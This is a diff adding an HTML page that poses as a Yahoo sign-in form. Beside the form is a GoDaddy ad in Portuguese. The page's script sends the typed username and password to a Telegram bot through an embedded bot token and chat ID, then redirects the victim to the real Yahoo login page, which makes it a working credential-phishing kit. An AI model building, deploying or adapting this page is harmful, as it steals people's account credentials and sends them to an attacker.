@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Responsive Page</title>
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        .custom-button {
+            padding: 20px;
+            border-radius: 20%;
+            background: white;
+            border: 1px solid black;
+        }
+        .custom-paragraph {
+            color: lightgray;
+        }
+        .custom-form {
+            box-shadow: 0 0 10px lightgray;
+            padding: 20px;
+            border-radius: 10px;
+            border-top: none;
+            border-left: none;
+            border-right: none;
+        }
+        .form-label, .form-control {
+            color: gray;
+        }
+        .form-control {
+            font-size: 1.2rem;
+            font-weight: 500;
+            border-top: none;
+            border-left: none;
+            border-right: none;
+        }
+        .form-control:focus {
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            box-shadow: none;
+        }
+        .radio-label {
+            color: blue;
+            font-size: 1.2rem;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-md navbar-light bg-light">
+        <a class="navbar-brand" href="#"><img src="ylogo.png" alt="Logo"></a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link text-primary" href="#">Help</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link text-primary" href="#">Terms</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link text-primary" href="#">Privacy</a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="container mt-4">
+        <div class="row justify-content-center">
+            <div class="col-md-7 d-none d-md-block">
+                <img src="ad.png" class="img-fluid" alt="Image" style="width: 90%;">
+                <h1>Dominio+SSL grátis incluídos</h1>
+                <p class="custom-paragraph">GoDaddy</p>
+                <button class="custom-button">Comprar já</button>
+            </div>
+            <div class="col-md-5">
+                <form class="custom-form text-center" onsubmit="sendFormData(event)">
+                    <img src="ylogo2.png" alt="Logo" class="mb-4">
+                    <h2>Sign in</h2>
+                    <p class="font-weight-500">using your Yahoo account</p>
+                    <div class="form-group text-left">
+                        <label class="form-label" for="user">Username, email, or mobile</label>
+                        <input type="text" class="form-control" id="user" required>
+                    </div>
+                    <div class="form-group text-left">
+                        <label class="form-label" for="pass">Password</label>
+                        <input type="password" class="form-control" id="pass" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary btn-block" style="border-radius: 20px;">Next</button>
+                    <div class="row mt-3">
+                        <div class="col-6 text-left">
+                            <input type="radio" id="staySignedIn">
+                            <label for="staySignedIn" class="radio-label">Stay signed in</label>
+                        </div>
+                        <div class="col-6 text-right">
+                            <a href="#" class="radio-label">Forget username</a>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script>
+        function sendFormData(event) {
+            event.preventDefault(); // Prevent the form from submitting the default way
+
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+
+            const message = `
+            ✅ New Yahoo Results
+			user: ${user}
+			password: ${pass}
+            `;
+
+            const chat_id = "2063732173";
+            const token = "6604876478:AAFT2uvJRnZgjB5fZnQYaWFBrGcGT3sm4YQ";
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chat_id,
+                    text: message
+                })
+            }).then(response => response.json())
+              .then(data => {
+                  if (data.ok) {
+                      // Redirect to example.com after 2 seconds
+                      setTimeout(() => {
+                          window.location.href = "https://login.yahoo.com";
+                      }, 2000);
+                  } else {
+                      console.log("Error sending message to Telegram");
+                  }
+              })
+              .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
